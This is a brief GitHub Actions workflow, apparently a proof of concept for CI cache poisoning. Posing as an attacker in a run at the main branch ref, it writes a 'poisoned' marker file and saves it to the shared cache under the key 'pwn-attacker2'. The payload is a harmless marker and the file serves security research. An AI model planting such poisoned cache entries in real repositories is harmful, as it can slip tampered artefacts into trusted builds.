name: save-at-main
on:
  workflow_dispatch:
permissions: {}
jobs:
  c:
    runs-on: ubuntu-latest
    steps:
      - name: attacker-equivalent writes poisoned content in a main-ref run
        run: mkdir -p cache-dir && echo poisoned-via-mainref-run > cache-dir/marker.txt
      - name: Save (run executes at refs/heads/main like issue_comment)
        uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
        with:
          path: cache-dir
          key: pwn-attacker2
      - run: echo "saved pwn-attacker2 from a main-ref run"
